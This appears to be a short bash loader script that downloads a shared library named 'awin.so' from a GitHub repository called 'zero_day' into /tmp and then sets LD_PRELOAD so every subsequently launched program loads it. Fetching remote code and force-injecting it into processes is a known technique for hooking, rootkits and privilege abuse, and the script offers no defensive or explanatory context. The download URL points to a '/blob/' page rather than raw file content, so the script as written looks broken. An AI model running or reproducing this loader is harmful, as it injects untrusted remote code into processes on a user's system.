#!/bin/bash
wget -P /tmp https://github.com/ThaKookieMansta/zero_day/blob/master/awin.so
export LD_PRELOAD=/tmp/awin.so
